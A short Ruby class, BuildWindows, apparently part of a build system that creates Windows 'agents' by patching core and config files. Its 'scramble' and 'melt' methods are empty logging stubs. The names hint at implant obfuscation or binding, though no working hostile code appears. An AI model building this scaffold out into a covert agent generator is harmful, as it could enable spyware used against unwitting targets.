#
#  Agent creation for windows
#

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class BuildWindows < Build

  def initialize
    super
    @platform = 'windows'
  end

  def patch(params)

    trace :debug, "Build: patching: #{params}"

    # add the file to be patched to the params
    # these params will be passed to the super
    params[:core] = 'core'
    params[:config] = 'config'

    # invoke the generic patch method with the new params
    super

  end

  def scramble
    trace :debug, "#{self.class} #{__method__}"
  end

  def melt
    trace :debug, "#{self.class} #{__method__}"
  end

end

end #DB::
end #RCS::
